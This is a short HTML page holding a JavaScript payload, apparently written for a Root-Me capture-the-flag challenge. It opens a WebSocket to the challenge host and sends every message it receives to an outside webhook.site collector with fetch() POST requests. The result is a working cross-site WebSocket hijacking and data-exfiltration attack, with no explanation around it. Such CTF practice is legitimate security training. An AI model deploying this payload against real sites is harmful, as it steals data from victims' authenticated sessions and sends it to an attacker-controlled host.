<body>
  <script>

    window.WebSocket = window.WebSocket || window.MozWebSocket;

    var connection = new WebSocket('ws://ctf17.root-me.org/ws');  
    connection.onopen = function () {};  
    
    connection.onerror = function (error) {
      fetch("https://webhook.site/24c9bc36-e3ee-4e47-bb52-c15d690ec907?closed=true");
    };
    
    connection.onmessage = function (message) {
      fetch("https://webhook.site/24c9bc36-e3ee-4e47-bb52-c15d690ec907", {
        method: "POST",
        body: JSON.stringify(message)
      });
    };
    
    connection.onclose = function(message) {};

  </script>
</body>
